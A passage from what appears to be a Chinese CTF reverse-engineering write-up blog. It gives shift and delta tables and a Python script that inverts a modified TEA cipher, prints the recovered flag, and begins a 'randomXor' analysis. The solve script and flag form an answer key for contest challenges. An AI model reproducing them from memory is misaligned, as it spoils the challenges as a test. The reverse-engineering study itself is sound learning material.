class="hljs-number">0x63293098</span>, <span class="hljs-number">0x714CFD4D</span>, <span class="hljs-number">0x47C8D0F7</span>]<br>SHL = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <br>       <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <br>       <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <br>       <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]<br>SHR = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <br>       <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <br>       <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <br>       <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>核心加密处理</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">m[<span class="hljs-number">0</span>] += ((m[<span class="hljs-number">1</span>] &lt;&lt; SHL0[i]) + key[<span class="hljs-number">0</span>]) ^ (m[<span class="hljs-number">1</span>] + <span class="hljs-built_in">sum</span>) ^ ((m[<span class="hljs-number">1</span>] &gt;&gt; SHR1[i]) + key[<span class="hljs-number">1</span>])<br>m[<span class="hljs-number">1</span>] += ((m[<span class="hljs-number">0</span>] &lt;&lt; SHL2[i]) + key[<span class="hljs-number">2</span>]) ^ (m[<span class="hljs-number">0</span>] + <span class="hljs-built_in">sum</span>) ^ ((m[<span class="hljs-number">0</span>] &gt;&gt; SHR3[i]) + key[<span class="hljs-number">3</span>])<br></code></pre></td></tr></table></figure><h4 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sar</span>(<span class="hljs-params">value,shift</span>):<br>    <span class="hljs-keyword">if</span> value &amp; <span class="hljs-number">0x80000000</span>: <span class="hljs-comment"># 如果 value 是负数</span><br>        <span class="hljs-keyword">return</span> (value &gt;&gt; shift) | (<span class="hljs-number">0xFFFFFFFF</span> &lt;&lt; (<span class="hljs-number">32</span> - shift))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> value &gt;&gt; shift<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_tea_ugly</span>(<span class="hljs-params">m,k,SHL,SHR,delta</span>):<br>    m0, m1 = m[<span class="hljs-number">0</span>], m[<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> + delta[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        m0 = (m0 +(((m1 &lt;&lt; SHL[i]) + k[<span class="hljs-number">1</span>]) ^ (m1 + <span class="hljs-built_in">sum</span>) ^ (sar(m1,SHR[i]) + k[<span class="hljs-number">0</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        m1 = (m1 + (((m0 &lt;&lt; SHL[i]) + k[<span class="hljs-number">3</span>]) ^ (m0 + <span class="hljs-built_in">sum</span>) ^ (sar(m0,SHR[i]) + k[<span class="hljs-number">2</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> [m0,m1]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec_tea_ugly</span>(<span class="hljs-params">m,k,SHL,SHR,delta</span>):<br>    m0, m1 = m[<span class="hljs-number">0</span>], m[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span> <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> + delta[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        m1 = (m1 -(((m0 &lt;&lt; SHL[i]) + k[<span class="hljs-number">3</span>]) ^ (m0 + <span class="hljs-built_in">sum</span>) ^ (sar(m0,SHR[i]) + k[<span class="hljs-number">2</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        m0 = (m0 -(((m1 &lt;&lt; SHL[i]) + k[<span class="hljs-number">1</span>]) ^ (m1 + <span class="hljs-built_in">sum</span>) ^ (sar(m1,SHR[i]) + k[<span class="hljs-number">0</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> -delta[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> [m0,m1]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">d2b</span>(<span class="hljs-params">dword</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(i.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;little&quot;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dword)<br><br>m = [<span class="hljs-number">0x31313131</span>,<span class="hljs-number">0x31313131</span>]<br>k = [<span class="hljs-number">0x55667788</span>,<span class="hljs-number">0x11223344</span>,<span class="hljs-number">0xCCDDEEFF</span>,<span class="hljs-number">0x9900AABB</span>]<br>SHL = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <br>       <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <br>       <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <br>       <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]<br>SHR = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <br>       <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <br>       <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <br>       <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>delta = [<br>    <span class="hljs-number">0x3CA6F3E</span>, <span class="hljs-number">0xF2E1C7F1</span>, <span class="hljs-number">0x79A22843</span>, <span class="hljs-number">0xD47FFC9D</span>, <span class="hljs-number">0xDD10F4C</span>, <span class="hljs-number">0x1DC368A1</span>, <span class="hljs-number">0x11B15F8A</span>, <span class="hljs-number">0x9469B3CD</span>, <br>    <span class="hljs-number">0x45D6DB5F</span>, <span class="hljs-number">0xBC6EE006</span>, <span class="hljs-number">0xA76D8146</span>, <span class="hljs-number">0xD542E337</span>, <span class="hljs-number">0x242E1155</span>, <span class="hljs-number">0xAA7F93DD</span>, <span class="hljs-number">0x88625ECB</span>, <span class="hljs-number">0x3738E499</span>, <br>    <span class="hljs-number">0xCEF27BB0</span>, <span class="hljs-number">0x134FF759</span>, <span class="hljs-number">0x358CA57E</span>, <span class="hljs-number">0x3461F310</span>, <span class="hljs-number">0x28540EE7</span>, <span class="hljs-number">0x81C0B176</span>, <span class="hljs-number">0xF725EE9C</span>, <span class="hljs-number">0xAF823A69</span>, <br>    <span class="hljs-number">0x61E8ECB3</span>, <span class="hljs-number">0xF4919548</span>, <span class="hljs-number">0x6AF44E11</span>, <span class="hljs-number">0x866162F3</span>, <span class="hljs-number">0x867F7E65</span>, <span class="hljs-number">0x6B26444C</span>, <span class="hljs-number">0x10216241</span>, <span class="hljs-number">0x9C1BA3CD</span>, <br>    <span class="hljs-number">0x1268FEAD</span>, <span class="hljs-number">0xF462B3B5</span>, <span class="hljs-number">0x5F7DE761</span>, <span class="hljs-number">0x72EAD5B6</span>, <span class="hljs-number">0xFBCE0C75</span>, <span class="hljs-number">0x44EF4142</span>, <span class="hljs-number">0x54DCC3C0</span>, <span class="hljs-number">0xAFFE805D</span>, <br>    <span class="hljs-number">0xC8833729</span>, <span class="hljs-number">0x3C944186</span>, <span class="hljs-number">0x261169A</span>, <span class="hljs-number">0xB547EA2F</span>, <span class="hljs-number">0x9B499585</span>, <span class="hljs-number">0xFE0190BF</span>, <span class="hljs-number">0x1EC74BE7</span>, <span class="hljs-number">0xAFC9292E</span>, <br>    <span class="hljs-number">0xC32F4EEF</span>, <span class="hljs-number">0x420A1A4</span>, <span class="hljs-number">0x94BEAB2B</span>, <span class="hljs-number">0xA0693238</span>, <span class="hljs-number">0x4DD5ADC1</span>, <span class="hljs-number">0x9F658F31</span>, <span class="hljs-number">0x1732EA46</span>, <span class="hljs-number">0x76BEE7DD</span>, <br>    <span class="hljs-number">0x12C63095</span>, <span class="hljs-number">0x9C202C7C</span>, <span class="hljs-number">0xAC9BB4C4</span>, <span class="hljs-number">0x1762AEAF</span>, <span class="hljs-number">0xCA41991E</span>, <span class="hljs-number">0xC0480F85</span>, <span class="hljs-number">0xBF534431</span>, <span class="hljs-number">0xF1C2780E</span>, <br>    <span class="hljs-number">0x990A7D6F</span>, <span class="hljs-number">0x69D22B81</span>, <span class="hljs-number">0x34DDECDE</span>, <span class="hljs-number">0x11ECD8F8</span>, <span class="hljs-number">0x22BB55D2</span>, <span class="hljs-number">0xFFA55B0</span>, <span class="hljs-number">0x6CC1AFBF</span>, <span class="hljs-number">0xA5610F61</span>, <br>    <span class="hljs-number">0x13190C95</span>, <span class="hljs-number">0xE09A5D29</span>, <span class="hljs-number">0xE7514731</span>, <span class="hljs-number">0x9AE21D7A</span>, <span class="hljs-number">0xB8D90F5A</span>, <span class="hljs-number">0x4C7299A9</span>, <span class="hljs-number">0xC4FDB94E</span>, <span class="hljs-number">0xA6475083</span>, <br>    <span class="hljs-number">0xBFB62E5</span>, <span class="hljs-number">0x8F7F77EB</span>, <span class="hljs-number">0xDA2568BB</span>, <span class="hljs-number">0x55C4DA9E</span>, <span class="hljs-number">0xC2932973</span>, <span class="hljs-number">0xCBC60B6D</span>, <span class="hljs-number">0xC46720FD</span>, <span class="hljs-number">0x2046D79D</span>, <br>    <span class="hljs-number">0x629CBD81</span>, <span class="hljs-number">0x932B1F48</span>, <span class="hljs-number">0x72ED29C0</span>, <span class="hljs-number">0xF4B566D3</span>, <span class="hljs-number">0xCBC53B21</span>, <span class="hljs-number">0x7836C87B</span>, <span class="hljs-number">0xBA4357B1</span>, <span class="hljs-number">0xCFD332E2</span>, <br>    <span class="hljs-number">0x4D488FCB</span>, <span class="hljs-number">0xA06DEFBF</span>, <span class="hljs-number">0x68211846</span>, <span class="hljs-number">0xC17F878D</span>, <span class="hljs-number">0x33B10E2C</span>, <span class="hljs-number">0xCFA0E756</span>, <span class="hljs-number">0x4C3C0691</span>, <span class="hljs-number">0x870BE107</span>, <br>    <span class="hljs-number">0x55B3FAF0</span>, <span class="hljs-number">0xFD39F8D7</span>, <span class="hljs-number">0x4B9A7795</span>, <span class="hljs-number">0x188CFA42</span>, <span class="hljs-number">0xAA79A09D</span>, <span class="hljs-number">0x620CF186</span>, <span class="hljs-number">0xEFDE898A</span>, <span class="hljs-number">0x2FA95D43</span>, <br>    <span class="hljs-number">0xD67359DB</span>, <span class="hljs-number">0x8625BC1B</span>, <span class="hljs-number">0x7A1A3BBC</span>, <span class="hljs-number">0xE6ECEF6C</span>, <span class="hljs-number">0xBA27A5C6</span>, <span class="hljs-number">0x559FE417</span>, <span class="hljs-number">0xF01DF04D</span>, <span class="hljs-number">0x3F910D52</span>, <br>    <span class="hljs-number">0x382B7BE</span>, <span class="hljs-number">0xAAECB195</span>, <span class="hljs-number">0x2E440D8E</span>, <span class="hljs-number">0xB3D58B0B</span>, <span class="hljs-number">0x3CA704B8</span>, <span class="hljs-number">0x63293098</span>, <span class="hljs-number">0x714CFD4D</span>, <span class="hljs-number">0x47C8D0F7</span>]<br><br><span class="hljs-comment"># res = enc_tea_ugly(m, k, SHL, SHR, delta)</span><br><span class="hljs-comment"># print([hex(x) for x in res])</span><br><br>data =[<span class="hljs-number">0x0BD3BE58</span>, <span class="hljs-number">0xBE73BBFB</span>, <span class="hljs-number">0xC8C8AF4E</span>, <span class="hljs-number">0x0B3C7D86</span>, <span class="hljs-number">0xC0257C09</span>, <br>       <span class="hljs-number">0x1D8FE0B0</span>, <span class="hljs-number">0x8837180C</span>, <span class="hljs-number">0xF5CF9D23</span>, <span class="hljs-number">0xB7A8B599</span>, <span class="hljs-number">0xAE630F3D</span>]<br><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>    block =[data[i],data[i+<span class="hljs-number">1</span>]]<br>    dec = dec_tea_ugly(block, k, SHL, SHR, delta)<br>    flag.extend(dec)  <span class="hljs-comment"># 用 extend 不是 append </span><br><br>flag_str = d2b(flag)<br><span class="hljs-built_in">print</span>(flag_str)<br><span class="hljs-built_in">print</span>(flag_str.decode(<span class="hljs-string">&quot;utf-8&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>))<br></code></pre></td></tr></table></figure><p>flag 是<code>flag&#123;UG1y_T3A_m@k35_[m3]_fe31_NaU5Eou5!&#125;</code></p><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>之前写过了，移步<a href="https://imconfident11.github.io/2025/05/24/vm/#NPC%C2%B2CTF-2025-babyVM">[NPC²CTF 2025]babyVM WP</a></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="randomXor"><a href="#randomXor" class="headerlink" title="randomXor"></a>randomXor</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>ida 反编译的 main 函数</p><figure class="highlight c"><table><tr><td 